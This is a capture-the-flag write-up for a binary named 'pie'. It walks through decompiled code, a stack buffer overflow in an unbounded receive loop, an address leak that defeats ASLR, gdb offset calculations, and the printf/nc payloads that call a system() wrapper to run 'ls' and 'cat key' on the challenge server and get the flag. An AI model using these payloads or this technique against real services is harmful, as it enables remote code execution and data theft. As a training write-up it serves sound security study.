pie
===

Background
----------
The goal was to retrieve the flag stored on the server

Tools used
----------
* IDA Pro
* `gdb`

Process
-------
Opening up the executable in IDA, I found that the function `handle` handled network connections, which I entered and got hexrays to decompile to:
````c
int __cdecl handle(int fd)
{
  int buf; // [sp+10h] [bp-18h]@1
  int v3; // [sp+14h] [bp-14h]@1
  int v4; // [sp+18h] [bp-10h]@1
  int v5; // [sp+1Ch] [bp-Ch]@1

  buf = 0;
  v3 = 0;
  v4 = 0;
  v5 = 0;
  sendstr(fd, "Enter your name: ");
  my_recv(fd, &buf);
  sendstr(fd, "Hello ");
  sendstr(fd, &buf);
  sendstr(fd, "!\n");
  return 0;
}
````

`my_recv` looked likely to be exploitable for this simple code, so I looked inside that:
````c
ssize_t __cdecl my_recv(int fd, void *buf)
{
  ssize_t result; // eax@3

  while ( 1 )
  {
    result = recv(fd, buf, 1u, 0);
    if ( result <= 0 )
      break;
    result = *(_BYTE *)buf;
    if ( (_BYTE)result == 10 )
      break;
    buf = (char *)buf + 1;
  }
  return result;
}
````

Wonderful, this function keeps on reading in input until it encounters a newline or EOF, obviously having a buffer overflow vulnerability.

Because DEP was turned on, I needed to find a vulnerable function to use, and conveniently, function `sistem` at address offset +0x963 contained this:
````c
int __cdecl sistem(const char *command)
{
  return system(command);
}
````

Because ASLR was turned on and this executable was relocatable, I needed to find both the stack address to use to pass a string to `sistem` and the executable base address to call `sistem`. I looked to the function `handle`'s stack:
````
-00000018 buf             db 24 dup(?)
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
````
From this, I now knew to put exactly 24 characters as input to completely fill `buf` and taking out it's terminating `NULL`, revealing both an address of the stack, the `ebp` save `s` and of the exectuable, the return address `r`.
````
$ printf 'aaaaaaaaaaaaaaaaaaaaaaaa' | nc 54.252.230.126 2345 | hexdump -C
00000000  45 6e 74 65 72 20 79 6f  75 72 20 6e 61 6d 65 3a  |Enter your name:|
00000010  20 48 65 6c 6c 6f 20 61  61 61 61 61 61 61 61 61  | Hello aaaaaaaaa|
00000020  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 f8  |aaaaaaaaaaaaaaa.|
00000030  bb e1 bf d3 9c 7f b7 04  21 0a                    |........!.|
````
This shows that the stack was located around 0xbfe1bbf8 and the executable was located around 0xb77f9cd3

I know that `handle` returns to `main` at offset +0xcd3, so calculating the difference in offsets told me that `sistem` was located at 0xb77f9963 on the server.

To find the stack address I required, which was the address four bytes following the address containing the return address so I could pass a string to `sistem`, I needed to do some live debugging to find out the difference between the stack address I aquired and the address I needed. This following `gdb` session sums it up:
````
$ gdb ./pie
<snip>
(gdb) set follow-fork-mode child
(gdb) break handle
Breakpoint 1 at 0x9d8
(gdb) r
Starting program: /path/to/pie
Listening on 0.0.0.0:2345
[New process 9925]
spawned child with pid = 9925
[Switching to process 9925]

Breakpoint 1, 0x565559d8 in handle ()
(gdb) disas handle
Dump of assembler code for function handle:
   0x565559d4 <+0>:	push   %ebp
   0x565559d5 <+1>:	mov    %esp,%ebp
   0x565559d7 <+3>:	push   %ebx
=> 0x565559d8 <+4>:	sub    $0x24,%esp
   0x565559db <+7>:	call   0x56555907 <__i686.get_pc_thunk.bx>
   0x565559e0 <+12>:	add    $0x2614,%ebx
   0x565559e6 <+18>:	lea    -0x18(%ebp),%eax
   0x565559e9 <+21>:	movl   $0x0,(%eax)
   0x565559ef <+27>:	movl   $0x0,0x4(%eax)
   0x565559f6 <+34>:	movl   $0x0,0x8(%eax)
   0x565559fd <+41>:	movl   $0x0,0xc(%eax)
   0x56555a04 <+48>:	lea    -0x21e8(%ebx),%eax
   0x56555a0a <+54>:	mov    %eax,0x4(%esp)
   0x56555a0e <+58>:	mov    0x8(%ebp),%eax
   0x56555a11 <+61>:	mov    %eax,(%esp)
   0x56555a14 <+64>:	call   0x5655590c <sendstr>
   0x56555a19 <+69>:	lea    -0x18(%ebp),%eax
   0x56555a1c <+72>:	mov    %eax,0x4(%esp)
   0x56555a20 <+76>:	mov    0x8(%ebp),%eax
   0x56555a23 <+79>:	mov    %eax,(%esp)
   0x56555a26 <+82>:	call   0x56555986 <my_recv>
   0x56555a2b <+87>:	lea    -0x21d6(%ebx),%eax
   0x56555a31 <+93>:	mov    %eax,0x4(%esp)
   0x56555a35 <+97>:	mov    0x8(%ebp),%eax
   0x56555a38 <+100>:	mov    %eax,(%esp)
   0x56555a3b <+103>:	call   0x5655590c <sendstr>
   0x56555a40 <+108>:	lea    -0x18(%ebp),%eax
   0x56555a43 <+111>:	mov    %eax,0x4(%esp)
   0x56555a47 <+115>:	mov    0x8(%ebp),%eax
   0x56555a4a <+118>:	mov    %eax,(%esp)
   0x56555a4d <+121>:	call   0x5655590c <sendstr>
   0x56555a52 <+126>:	lea    -0x21cf(%ebx),%eax
   0x56555a58 <+132>:	mov    %eax,0x4(%esp)
   0x56555a5c <+136>:	mov    0x8(%ebp),%eax
   0x56555a5f <+139>:	mov    %eax,(%esp)
   0x56555a62 <+142>:	call   0x5655590c <sendstr>
   0x56555a67 <+147>:	mov    $0x0,%eax
   0x56555a6c <+152>:	add    $0x24,%esp
   0x56555a6f <+155>:	pop    %ebx
   0x56555a70 <+156>:	pop    %ebp
   0x56555a71 <+157>:	ret
End of assembler dump.
(gdb) x/10xw $esp
0xffffd0d4:	0x56557ff4	0xffffd148	0x56555cd3	0x00000008
0xffffd0e4:	0x000003e9	0xffffd12c	0xffffd130	0x00000004
0xffffd0f4:	0x0000002f	0xffffd14c
````
The stack address I would have been shown was 0xffffd148 while the stack address I needed was 0xffffd0e4. This gives a difference between the two of -0x64.

Now I have the required information, I prepare my input:
````
aaaaaaaaaaaaaaaaaaaaaaaaaaaa ; 28 bytes of padding to the return address
\x63\x99\x7f\xb7 ; Address of function sistem at 0xb77f9963
aaaa ; Padding for fake sistem return address
\x98\xbb\xe1\xbf ; Address of following byte as the string to pass (0xbfe1bbf8 - 0x64 + 4) = 0xbfe1bb98
ls >&4\x00 ; Command to run with terminating NULL. File descriptor 4 is always the one corresponding to the network socket.
````
````
$ printf 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa\x63\x99\x7f\xb7aaaa\x98\xbb\xe1\xbfls >&4\x00' | nc 54.252.230.126 2345
Enter your name: key
pie
$ printf 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa\x63\x99\x7f\xb7aaaa\x98\xbb\xe1\xbfcat key >&4\x00' | nc 54.252.230.126 2345
Enter your name: 12yhEzKPaC7wWHAAtBjsUY3K6H3woG3LGw
````